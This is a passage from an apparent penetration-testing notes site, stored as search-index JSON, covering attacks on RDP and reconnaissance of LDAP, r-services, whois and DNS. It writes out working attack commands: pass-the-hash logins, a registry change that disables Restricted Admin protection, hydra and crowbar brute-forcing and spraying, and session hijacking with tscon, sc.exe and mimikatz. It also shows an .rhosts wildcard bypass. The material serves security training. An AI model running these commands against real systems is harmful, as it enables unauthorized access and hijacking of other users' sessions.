/cert:ignore : Specifies to the scrips that all security certificate usage should be ignored.\n# /u:Administrator : Specifies the login username to be \"Administrator\".\n# /v:$ip: Specifies the target IP of the host we would like to connect to.\n</code></pre> <p>If successful, during the initialization of the RDP session, we will be asked for a password. We can hit Enter to see if the process continue without one.  Sometimes there are severe mishaps in configurations like this and we can gain access.</p> <p>If you know user and credentials:</p> <pre><code>xfreerdp /u:&lt;username&gt; /p:&lt;\"password\"&gt; /v:$ip \n\n# Sometimes there are some issues with certs and resolution. In those cases\nxfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution\n</code></pre> <pre><code>xfreerdp [/d:domain] /u:&lt;username&gt; /p:&lt;password&gt; /v:$ip\n\n#Pass the hash\nxfreerdp [/d:domain] /u:&lt;username&gt; /pth:&lt;hash&gt; /v:$ip \n</code></pre> <p>Troubleshoot in PtH attack</p> <p>Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa</code> with the value of 0. It can be done using the following command:</p> <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdesktop","title":"rdesktop","text":"<p>See rdesktop.</p> <pre><code>rdesktop -u &lt;username&gt; $ip\nrdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; $ip\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#attacks","title":"Attacks","text":"","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#password-guessing","title":"Password guessing","text":"","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdp_checkpy-from-impacket","title":"rdp_check.py from Impacket","text":"<p>Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. There is a tool for checking known credentials against RDP services.</p> <p>rdp_check.py from impacket let you check if some credentials are valid for a RDP service:</p> <pre><code>rdp_check &lt;domain&gt;/&lt;name&gt;:&lt;password&gt;@$ip\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#brute-force","title":"Brute force","text":"<p>Just think it twice: in many cases, a user account will be locked or disabled after a certain number of failed login attempts.</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#ncrack","title":"ncrack","text":"<pre><code>ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://$ip\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#hydra","title":"hydra","text":"<pre><code>hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://$ip\n\nhydra -L user.list -P password.list rdp://$ip\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#password-spraying","title":"Password Spraying","text":"<p>Be careful, you could lock accounts. </p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#crowbar","title":"Crowbar","text":"<p>See crowbar.</p> <pre><code># https://github.com/galkan/crowbar\ncrowbar -b rdp -s $ip/32 -U users.txt -c 'password123'\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#hydra_1","title":"Hydra","text":"<p>See hydra.</p> <pre><code># hydra\nhydra -L usernames.txt -p 'password123' $ip rdp\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdp-session-hijacking","title":"RDP Session Hijacking","text":"<p>With SYSTEM privileges you can access any opened RDP session by any user without the need of knowing the password of the owner.</p> <p>Then, in Powershell, get opened sessions:</p> <pre><code>query user\n</code></pre> <p>Access to the selected session:</p> <pre><code>tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;\n</code></pre> <p>Now you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.</p> <p>Important: When you access an active RDP sessions you will kickoff the user that was using it.</p> <p>You could get passwords from the process dumping it, but this method is much faster and led you interact with the virtual desktops of the user (passwords in notepad without been saved in disk, other RDP sessions opened in other machines...).</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#mimikatz-session-hijacking","title":"Mimikatz Session Hijacking","text":"<p>You could also use mimikatz to steal a session:</p> <pre><code>ts::sessions #Get sessions\nts::remote /id:2 #Connect to the session\n</code></pre> <p>Sticky-keys &amp; Utilman Combining this technique with stickykeys or utilman you will be able to access a administrative CMD and any RDP session anytime</p> <p>You can search RDPs that have been backdoored with one of these techniques already with: https://github.com/linuz/Sticky-Keys-Slayer</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#psexec-for-escalating-privileges-this-method-no-longer-works-on-server-2019","title":"PsExec for escalating privileges: This method no longer works on Server 2019","text":"<p>PsExec is particularly effective for privilege escalation because it can create and run processes with SYSTEM privileges, even if executed from an Administrator account. Here\u2019s how this process typically works:</p> <ul> <li>Command Execution as SYSTEM: When using PsExec with the <code>-s</code> flag (e.g., <code>psexec -s cmd.exe</code>), it launches a process that runs with SYSTEM privileges instead of the Administrator privileges of the account running it.</li> <li>How It Works Internally: PsExec does this by leveraging Windows services, which typically run as SYSTEM by default. PsExec creates a temporary service on the machine to launch a command or program with SYSTEM privileges, then removes the service after completion.</li> <li>Escalation Path: Once PsExec launches a command prompt or other executable with SYSTEM privileges, the user essentially has unrestricted access. This enables them to perform actions that would other</li> </ul> <p>Example of an exploitation: creating a service that will run as SYSTEM</p> <pre><code>query user\n</code></pre> <p>Results:</p> <pre><code> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n&gt;juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM\n lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM\n</code></pre> <pre><code>sc.exe create Nameofservice binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\"\n</code></pre> <p>Explanation: Create a Windows service that, by default, run as\u00a0<code>Local System</code>\u00a0and will execute any binary with\u00a0<code>SYSTEM</code>\u00a0privileges. We use\u00a0Microsoft sc.exe\u00a0binary. First, we specify the service name (<code>Nameofservice</code>) and the\u00a0<code>binpath</code>, which is the command we want to execute. Once we run the following command, a service named\u00a0<code>Nameofservice</code>\u00a0will be created.</p> <p>Initiate the service:</p> <pre><code>net start Nameofservice\n</code></pre> <p>Once the service is started, a new terminal with the\u00a0<code>lewen</code>\u00a0user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdp-with-pth-attack","title":"RDP with  PtH attack","text":"<pre><code>xfreerdp [/d:domain] /u:&lt;username&gt; /pth:&lt;hash&gt; /v:$ip\n# /pth:&lt;hash&gt;   Pass the hash\n</code></pre> <p>Trobleshooting: Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa</code> with the value of 0. It can be done using the following command:</p> <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#dos","title":"DoS","text":"<p>To check the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).</p> <p>nmap uses RDPcookies (mstshash=nmap) to interact with the RDP server. These cookies can be identified by  security services such as EDRs, and can lock us out, so we need to think twice before running that scan.</p> <pre><code>nmap -Pn -sV -p3389 --script rdp-*  $ip\n</code></pre> <p>Results: <pre><code>PORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-enum-encryption:\n|   Security layer\n|     CredSSP (NLA): SUCCESS\n|     CredSSP with Early User Auth: SUCCESS\n|_    RDSTLS: SUCCESS\n| rdp-ntlm-info:\n|   Target_Name: EXPLOSION\n|   NetBIOS_Domain_Name: EXPLOSION\n|   NetBIOS_Computer_Name: EXPLOSION\n|   DNS_Domain_Name: Explosion\n|   DNS_Computer_Name: Explosion\n|   Product_Version: 10.0.17763\n|_  System_Time: 2022-11-11T12:16:26+00:00\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre></p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdp-process-injection","title":"RDP Process Injection","text":"<p>If someone from a different domain or with better privileges login via RDP to the PC where you are an Admin, you can inject your beacon in his RDP session process and act as him. </p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdp-sessions-abuse","title":"RDP Sessions Abuse","text":"<pre><code># Adding User to RDP group\nnet localgroup \"Remote Desktop Users\" UserLoginName /add\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#shadow-attack","title":"Shadow Attack","text":"<p>AutoRDPwn is a post-exploitation framework created in Powershell, designed primarily to automate the Shadow attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.</p> <p>https://github.com/JoelGMSec/AutoRDPwn</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#bluekeep","title":"Bluekeep","text":"<p>In 2019, a critical vulnerability was published in the RDP (<code>TCP/3389</code>) service that also led to remote code execution (<code>RCE</code>) with the identifier\u00a0CVE-2019-0708.</p> <p>A remote code execution vulnerability exists in Remote Desktop Services \u2013 formerly known as Terminal Services \u2013 when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"389-636-ldap/","title":"389 -  636 LDAP","text":"<p>Application protocol used for accessing, modifying and querying distributed\u00a0directory information services (such as Active Directory) over a TCP/Internet Protocol\u00a0(IP) network. A Directory service would be a database-like virtual storage that holds data in a specific hierarchical structure. LDAP structure is based on a tree of directory entries.</p> <p>Lightweight Directory Access Protocol (LDAP) is an integral part of Active Directory (AD). The\u00a0Lightweight Directory Access Protocol\u00a0(LDAP)\u00a0is an open, vendor-neutral, industry standard\u00a0application protocol for accessing and maintaining distributed\u00a0directory information services over a TCP/IP\u00a0Internet Protocol\u00a0(IP) network.</p> <p>LDAP runs on port 389 (unencrypted connections) and 636 (LDAP SSL.)</p> <p>The relationship between AD and LDAP can be compared to Apache and HTTP. The same way Apache is a web server that uses the HTTP protocol, Active Directory is a directory server that uses the LDAP protocol. While uncommon, you may come across organizations while performing an assessment that does not have AD but does have LDAP, meaning that they most likely use another type of LDAP server such as OpenLDAP.</p> <ul> <li>TCP and UDP port 389 and 636.</li> <li>It's a binary protocol and by default not encrypted.</li> <li>Has been updated to include encryptions addons, as Transport Layer Security (TLS)/SSL and can be tunnelled through SSH</li> </ul> <p>The hierarchy (tree) of information stored via LDAP is known as the Directory Information Tree (DIT). That structure is defined in a schema.</p> <p>A common use of LDAP is to provide a central place to store usernames and passwords. This allows many different applications and services to connect to the LDAP server to validate users.</p> <p>The latest LDAP specification is Version 3, which is published as RFC 4511. AD stores user account information and security information such as passwords and facilitates sharing this information with other devices on the network. LDAP is the language that applications use to communicate with other servers that also provide directory services. In other words, LDAP is a way that systems in the network environment can \"speak\" to AD.</p>","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#ad-ldap-authentication","title":"AD LDAP Authentication","text":"<p>LDAP is set up to authenticate credentials against AD using a \"BIND\" operation to set the authentication state for an LDAP session. There are two types of LDAP authentication.</p> <p>1. Simple Authentication: This includes anonymous authentication, unauthenticated authentication, and username/password authentication. Simple authentication means that a username and password create a BIND request to authenticate to the LDAP server.</p> <p>2. SASL Authentication: The Simple Authentication and Security Layer (SASL) framework uses other authentication services, such as Kerberos, to bind to the LDAP server and then uses this authentication service (Kerberos in this example) to authenticate to LDAP. The LDAP server uses the LDAP protocol to send an LDAP message to the authorization service which initiates a series of challenge/response messages resulting in either successful or unsuccessful authentication. SASL can provide further security due to the separation of authentication methods from application protocols. </p> <p>LDAP authentication messages are sent in cleartext by default so anyone can sniff out LDAP messages on the internal network. It is recommended to use TLS encryption or similar to safeguard this information in transit.</p>","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#ldif-file","title":"LDIF file","text":"<p>Example of a LDIF file:</p> <pre><code>dn: dc=example,dc=com\nobjectclass: top\nobjectclass: domain\ndc: example\n\ndn: ou=People, dc=example,dc=com\nobjectclass: top\nobjectclass: organizationalunit\nou: People\naci: (targetattr=\"*||+\")(version 3.0; acl \"IDM Access\"; allow (all)\n  userdn=\"ldap:///uid=idm,ou=Administrators,dc=example,dc=com\";)\n\ndn: uid=jgibbs, ou=People, dc=example,dc=com\nuid: jgibbs\ncn: Joshamee Gibbs\nsn: Gibbs\ngivenname: Joshamee\nobjectclass: top\nobjectclass: person\nobjectclass: organizationalPerson\nobjectclass: inetOrgPerson\nl: Caribbean\nmail: jgibbs@blackpearl.com\ntelephonenumber: +1 408 555 1234\nfacsimiletelephonenumber: +1 408 555 4321\nuserpassword: supersecret\n\ndn: uid=hbarbossa, ou=People, dc=example,dc=com\nuid: hbarbossa\ncn: Hector Barbossa\nsn: Barbossa\ngivenname: Hector\nobjectclass: top\nobjectclass: person\nobjectclass: organizationalPerson\nobjectclass: inetOrgPerson\nl: Caribbean\no: Brethren Court\nmail: captain.barbossa@example.com\ntelephonenumber: +421 910 382734\nfacsimiletelephonenumber: +1 408 555 1111\nroomnumber: 111\nuserpassword: deadjack\n\n# Note:\n# Lord Bectett is an exception to the cn = givenName + sn rule\n\ndn: uid=jbeckett, ou=People, dc=example,dc=com\nuid: jbeckett\ncn: Lord Cutler Beckett\nsn: Beckett\ngivenname: Cutler\nobjectclass: top\nobjectclass: person\nobjectclass: organizationalPerson\nobjectclass: inetOrgPerson\nl: Caribbean\no: East India Trading Co.\nmail: bigboss@eitc.com\ntelephonenumber: +421 910 382333\nfacsimiletelephonenumber: +1 408 555 2222\nroomnumber: 666\nuserpassword: takeovertheworld\n\ndn: ou=Groups, dc=example,dc=com\nobjectclass: top\nobjectclass: organizationalunit\nou: Groups\naci: (targetattr=\"*||+\")(version 3.0; acl \"IDM Access\"; allow (all)\n  userdn=\"ldap:///uid=idm,ou=Administrators,dc=example,dc=com\";)\n\ndn: cn=Pirates,ou=groups,dc=example,dc=com\nobjectclass: top\nobjectclass: groupOfUniqueNames\ncn: Pirates\nou: groups\nuniquemember: uid=jgibbs, ou=People, dc=example,dc=com\nuniquemember: uid=barbossa, ou=People, dc=example,dc=com\ndescription: Arrrrr!\n\ndn: ou=Administrators, dc=example,dc=com\nobjectclass: top\nobjectclass: organizationalunit\nou: Administrators\n\ndn: uid=idm, ou=Administrators,dc=example,dc=com\nobjectclass: top\nobjectclass: person\nobjectclass: organizationalPerson\nobjectclass: inetOrgPerson\nuid: idm\ncn: IDM Administrator\nsn: IDM Administrator\ndescription: Special LDAP acccount used by the IDM\n  to access the LDAP data.\nou: Administrators\nuserPassword: secret\nds-privilege-name: unindexed-search\n</code></pre> <p>Ldap operators:</p> Operator Description = Equal to | Logical OR ! Logical NOT &amp; Logical AND * Wildcard, any strings or character <p>Example: any surname starting by \"a\" or canonical name starting by \"b.\"</p> <pre><code>(|(sn=a*)(cn=b*))\n</code></pre>","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#ldap-queries-ldapfilter","title":"LDAP queries: LDAPFilter","text":"<p>By combining the  \"Get-ADObject\" cmdlet  with the \"LDAPFilter\" parameter in powershell we can perform some ldap queries via powershell. </p> <pre><code>Get-ADObject -LDAPFilter &lt;FILTER&gt; | select cn\n</code></pre> <p>Some useful  LDAPFilters:</p> Search for LDAP query Find All Workstations ' (objectCategory=computer)' Find All DomainControllers '(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' Search for LDAP query Find All Users ' (&amp;(objectCategory=person)(objectClass=user))' Filnd All Contacts '(objectClass=contact)' Find All Users and Contacts '(objectClass=user)' List Disabled Users '(userAccountControl:1.2.840.113556.1.4.803:=2)' Search for LDAP query Find All Groups '(objectClass=group)' Find direct members of a Security Group '(memberOf=CN=Admin,OU=Security,DC=DOM,DC=NT)' <p>More:</p> <ul> <li>LDAP Queries related to AD computers</li> <li>LDAP queries related to AD users.</li> <li>LDAP queries related to AD groups.</li> </ul>","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#ldap-queries-search-filters","title":"LDAP queries: Search Filters","text":"<p>The LDAPFilter parameter with the same cmdlets lets us use LDAP search filters when searching for information. </p> <p>Operators: </p> <ul> <li>&amp; -&gt; and</li> <li>| -&gt; or</li> <li>! -&gt; not</li> </ul> <p>AND Operation:</p> <ul> <li>One criteria: <code>(&amp; (..C1..) (..C2..))</code></li> <li>More than two criteria: <code>(&amp; (..C1..) (..C2..) (..C3..))</code></li> </ul> <p>OR Operation:</p> <ul> <li>One criteria: <code>(| (..C1..) (..C2..))</code></li> <li>More than two criteria: <code>(| (..C1..) (..C2..) (..C3..))</code></li> </ul>","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#filters","title":"Filters","text":"Criteria Rule Example Equal to (attribute=123) (&amp;(objectclass=user)(displayName=Smith) Not equal to (!(attribute=123)) !objectClass=group) Present (attribute=*) (department=*) Not present (!(attribute=*)) (!homeDirectory=*) Greater than (attribute&gt;=123) (maxStorage=100000) Less than (attribute&lt;=123) (maxStorage&lt;=100000) Approximate match (attribute~=123) (sAMAccountName~=Jason) Wildcards (attribute=*A) (givenName=*Sam)","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#exploiting-vulndap","title":"Exploiting vuLnDAP","text":"<p>https://github.com/digininja/vuLnDAP</p> <p>All schema for querying is in https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html</p> <p>Examples:</p> <p></p> <p></p> <p></p>","tags":["active","directory","ldap","windows","port","389"]},{"location":"389-636-ldap/#example","title":"Example","text":"<p>When using dsquery:</p> <pre><code># Searching for Domain Controllers\n dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n# userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).\n# =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. \n</code></pre> <p><code>userAccountControl:1.2.840.113556.1.4.803:</code>\u00a0Specifies that we are looking at the\u00a0User Account Control (UAC) attributes\u00a0for an object.</p> <ul> <li><code>userAccountControl:1.2.840.113556.1.4.803:</code>\u00a0Specifies that we are looking at the\u00a0User Account Control (UAC) attributes\u00a0for an object.</li> <li> <p><code>=8192</code>\u00a0represents the decimal bitmask we want to match in this search.  OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:</p> </li> <li> <p><code>1.2.840.113556.1.4.803</code> When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.</p> </li> <li> <p><code>1.2.840.113556.1.4.804</code> When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.</p> </li> <li> <p><code>1.2.840.113556.1.4.1941</code> This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.</p> </li> </ul> <p>Search users with UAC set to <code>Password Can't Change</code>:</p> <pre><code>dsquery * -filter \"(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))\"\n</code></pre>","tags":["active","directory","ldap","windows","port","389"]},{"location":"43-whois/","title":"Port 43 - whois","text":"<p>It is a TCP-based transaction-oriented query/response protocol listening on TCP port 43 by default. We can use it for querying databases containing domain names, IP addresses, or autonomous systems and provide information services to Internet users.</p> <p>The Internet Corporation of Assigned Names and Numbers (<code>ICANN</code>) requires that accredited registrars enter the holder's contact information, the domain's creation, and expiration dates, and other information in the Whois database immediately after registering a domain. In simple terms, the Whois database is a searchable list of all domains currently registered worldwide.</p> <p>Sysinternals WHOIS for Windows or Linux WHOIS command-line utility are our preferred tools for gathering information. However, there are some online versions like whois.domaintools.com we can also use.</p> <pre><code># linux\nwhois $TARGET\n\n# windows\nwhois.exe $TARGET\n</code></pre>","tags":["port 111","rpc","NFS","Network File System"]},{"location":"512-513-514-remote-services/","title":"Ports 512, 513, 514 - Remote services","text":"<p>R-services span across the ports 512, 513, and 514 and are only accessible through a suite of programs known as r-commands. R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.</p> <p>r-services were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (SSH) protocols and commands due to inherent security flaws built into them. They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time.</p> <p>The R-commands suite consists of the following programs:</p> <ul> <li>rcp (<code>remote copy</code>)</li> <li>rexec (<code>remote execution</code>)</li> <li>rlogin (<code>remote login</code>)</li> <li>rsh (<code>remote shell</code>)</li> <li>rstat</li> <li>ruptime</li> <li>rwho (<code>remote who</code>).</li> </ul> <p>These are the most frequently abused commands:</p> Command Service Daemon Port Transport Protocol Description <code>rcp</code> <code>rshd</code> 514 TCP Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the <code>cp</code> command on Linux but provides <code>no warning to the user for overwriting existing files on a system</code>. <code>rsh</code> <code>rshd</code> 514 TCP Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files for validation. <code>rexec</code> <code>rexecd</code> 512 TCP Enables a user to run shell commands on a remote machine. Requires authentication through the use of a <code>username</code> and <code>password</code> through an unencrypted network socket. Authentication is overridden by the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files. <code>rlogin</code> <code>rlogind</code> 513 TCP Enables a user to log in to a remote host over the network. It works similarly to <code>telnet</code> but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files. <p>The /etc/hosts.equiv file contains a list of trusted hosts and it is used to grant access to other systems on the network.</p>","tags":["r-services"]},{"location":"512-513-514-remote-services/#footprinting-r-services","title":"Footprinting r-services","text":"<pre><code>sudo nmap -sV -p 512,513,514 $ip\n</code></pre>","tags":["r-services"]},{"location":"512-513-514-remote-services/#accessing-the-service","title":"Accessing the service","text":"<pre><code># Login \nrlogin $ip -l &lt;username&gt;\n\n# list all interactive sessions on the local network by sending requests to the UDP port 513\nrwho\n\n#  detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).\nrusers -al $ip\n</code></pre>","tags":["r-services"]},{"location":"512-513-514-remote-services/#bypass-authentication-via-etchostsequiv-and-rhosts-files","title":"Bypass  authentication via <code>/etc/hosts.equiv</code>\u00a0and\u00a0<code>.rhosts</code>\u00a0files","text":"<p>The\u00a0<code>hosts.equiv</code>\u00a0file is recognized as the global configuration regarding all users on a system, whereas\u00a0<code>.rhosts</code>\u00a0provides a per-user configuration.</p> <p>Even though, these r-services utilize Pluggable Authentication Modules (PAM) for user authentication onto a remote system by default, they also bypass this authentication through the use of the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files on the system.</p> <p>If any misconfiguration exists on those files, we could get access to those services.</p> <pre><code># Example of a misconfiguration in rhosts file:\n\nhtb-student     10.0.17.5\n+               10.0.17.10\n+               +\n\n# The file follows the specific syntax of `&lt;username&gt; &lt;ip address&gt;` or `&lt;username&gt; &lt;hostname&gt;` pairs. Additionally, the `+` modifier can be used within these files as a wildcard to specify anything. In this example, the `+` modifier allows any external user to access r-commands from the `htb-student` user account via the host with the IP address `10.0.17.10`.\n</code></pre>","tags":["r-services"]},{"location":"53-dns/","title":"Port 53 - Domain Name Server (DNS)","text":"<p>Globally distributed DNS servers translate domain names into IP addresses and thus control which server a user can reach via a particular domain. There are several types of DNS servers that are used worldwide:</p> Server Type Description <code>DNS Root Server</code> Root servers of DNS are responsible for the top-level domains (<code>TLD</code>). As the last instance, they are only requested if the name server does not respond. The <code>ICANN</code> coordinates the work of the root name servers. There are 13 such root servers around the globe. <code>Authoritative Nameserver</code> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. <code>Non-authoritative Nameserver</code> Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying. <code>Caching DNS Server</code> Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage. <code>Forwarding Server</code> Forwarding servers perform only one function: they forward DNS queries to another DNS server. <code>Resolver</code> Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#resource-records","title":"Resource records","text":"<p>A resource record is a four-tuple that contains the following 4 fields:</p> <pre><code>(Name, Value, Type, TTL)\n</code></pre> <p>The \"<code>IN</code>\" in the examples stands for \"Internet.\" It's a class field in DNS records that specifies the protocol family. In most cases, you'll see \"<code>IN</code>\" used, as it denotes the Internet protocol suite (IP) used for most domain names. Other class values exist (e.g.,\u00a0<code>CH</code>\u00a0for Chaosnet,\u00a0<code>HS</code>\u00a0for Hesiod) but are rarely used in modern DNS configurations.</p> Record Type Full Name Description Zone File Example <code>A</code> Address Record Maps a hostname to its IPv4 address. If Type=A, then Name is a hostname and Value is the IP address for that name. We recognize the IP addresses that point to a specific (sub)domain through the A record.  Example: <code>(relay1.bar.example.com, 145.222.36.125, A)</code> <code>www.example.com.</code>\u00a0IN A\u00a0<code>192.0.2.1</code> <code>AAAA</code> IPv6 Address Record Maps a hostname to its IPv6 address. <code>www.example.com.</code>\u00a0IN AAAA\u00a0<code>2001:db8:85a3::8a2e:370:7334</code> <code>CNAME</code> Canonical Name Record Creates an alias for a hostname, pointing it to another hostname. If Type=CNAME, then Value is a canonical hostname for the alias hostname Name. Example:<code>(example.com,relay1.bar.example.com,CNAME)</code> <code>blog.example.com.</code>\u00a0IN CNAME\u00a0<code>webserver.example.net.</code> <code>MX</code> Mail Exchange Record Specifies the mail server(s) responsible for handling email for the domain. If Type=MX, then Value is the canonical name of a mail server that has an alias hostname Name. The mail server records show us which mail server is responsible for managing the emails for the company. Example:<code>(example.com,mail.bar.example.com,MX)</code> <code>example.com.</code>\u00a0IN MX 10\u00a0<code>mail.example.com.</code> <code>NS</code> Name Server Record Delegates a DNS zone to a specific authoritative name server. If Type=NS, then Name is a domain (such as example.com) and Value is the name of an authoritative DNS server that knows how to obtain the IP address for hosts in the domain. These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider. Example:<code>(example.com,dns.example.com,NS)</code> <code>example.com.</code>\u00a0IN NS\u00a0<code>ns1.example.com.</code> <code>TXT</code> Text Record Stores arbitrary text information, often used for domain verification or security policies. This type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent. Here we can already see some valuable information if we look closer at the results. <code>example.com.</code>\u00a0IN TXT\u00a0<code>\"v=spf1 mx -all\"</code>\u00a0(SPF record) <code>SOA</code> Start of Authority Record Specifies administrative information about a DNS zone, including the primary name server, responsible person's email, and other parameters. (<code>Start Of Authority</code> (<code>SOA</code>)). It should be first in a zone file because it indicates the start of a zone. Each zone can only have one <code>SOA</code> record, and additionally, it contains the zone's values, such as a serial number and multiple expiration timeouts. Provides information about the corresponding DNS zone and email address of the administrative contact. The <code>SOA</code> record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. <code>example.com.</code>\u00a0IN SOA\u00a0<code>ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400</code> <code>SRV</code> Service Record Defines the hostname and port number for specific services. <code>_sip._udp.example.com.</code>\u00a0IN SRV 10 5 5060\u00a0<code>sipserver.example.com.</code> <code>PTR</code> Pointer Record Used for reverse DNS lookups, mapping an IP address to a hostname. The PTR (Pointer) record works the other way around (reverse lookup). It converts IP addresses into valid domain names. For the IP address to be resolved from the <code>Fully Qualified Domain Name</code> (<code>FQDN</code>), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a <code>PTR</code> record. The PTR records are responsible for the reverse translation of IP addresses into names. <code>1.2.0.192.in-addr.arpa.</code>\u00a0IN PTR\u00a0<code>www.example.com.</code> <p>Summarizing:</p> <p></p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#security","title":"Security","text":"<p>DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply DNS over TLS (DoT) or DNS over HTTPS (DoH) here. In addition, the network protocol NSCrypt also encrypts the traffic between the computer and the name server.</p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#ips-to-add-to-etcresolvconf","title":"IPs to add to 